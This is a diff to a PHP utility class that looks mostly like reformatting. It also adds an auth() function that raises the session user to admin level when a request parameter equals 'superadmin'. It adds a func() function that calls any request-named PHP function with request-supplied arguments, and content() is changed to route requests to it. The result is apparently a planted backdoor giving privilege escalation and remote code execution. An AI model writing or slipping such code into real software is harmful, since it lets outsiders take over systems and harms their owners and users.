@@ -1,23 +1,29 @@
 <?php
 
 class utils{
-	static $private='1';
+static $private='1';
 	
-	static function value($prm){
-		return $prm['value'];
-	}
+static function value($p){
+	return $p['value'];}
+
+static function result($p){
+	return $p['inp1'].': '.$p['msg'];}
 	
-	static function result($prm){
-		return $prm['inp1'].': '.$prm['msg'];
-	}
+static function auth($p){
+	$uid=Sql::read('id','login','v',['id'=>1]);
+	if(ses('uid'==1) or $p['param']=='superadmin')
+		Sql::update('login','auth','6','uid',ses('uid'));
+	return 'ok';}
 
-	static function resistance($prm){		
-		return implode('',array_fill(0,1000,'123456789 '));
-	}
+static function func($p){$pb=explode('-',$p['o']);
+	return call_user_func_array($p['param'],$pb);}
 
-	static function content($prm){$ret='';
-		return hlpbt('ffw');
-	}
+static function resistance($p){		
+	return implode('',array_fill(0,1000,'123456789 '));}
+
+static function content($p){
+	if(val($p,'param'))return self::func($p);
+	return hlpbt('ffw');}
 	
 }
 
